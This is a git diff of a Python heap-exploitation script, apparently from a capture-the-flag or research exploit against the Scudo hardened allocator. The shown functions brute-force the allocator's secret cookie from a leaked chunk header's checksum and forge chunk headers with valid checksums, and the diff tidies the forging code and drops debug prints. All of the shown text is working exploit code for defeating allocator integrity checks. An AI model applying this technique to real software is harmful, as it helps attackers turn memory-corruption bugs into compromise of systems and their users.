@@ -52,21 +52,15 @@ def get_cookie_cheat(io, scudo_base):
     return cookie 
 
 def forge_header(address, cookie, new_header) -> bytes:
-    new_checksum = calc_checksum(address, cookie, new_header) 
-    crc = crc32c(new_header.to_bytes(8, 'little'), crc32c((address).to_bytes(8, 'little'), cookie))
-    crc = crc ^ (crc >> 0x10)
-    print(f'crc computed: {hex(crc)}')
-    forged_header = new_header.to_bytes(6, 'little') + crc.to_bytes(2, 'little') + b"\0"*8 
-    return forged_header    
+    new_checksum = calc_checksum(address, cookie, new_header)
+    forged_header = new_header + (new_checksum << 0x30)
+    return forged_header.to_bytes(8, 'little')
 
 def bruteforce_cookie(io, addr):
     header = read(io, addr-0x10, 0x10)[0]
-    print(f"header {hex(header)}")
 
     checksum = header >> 0x30
-    print(f'checksum: {hex(checksum)}')
     header = header & ((1 << 0x30)-1)
-    print(f'header: {hex(header)}') 
     cookie = bruteforce(addr, checksum, header)
 
     return cookie
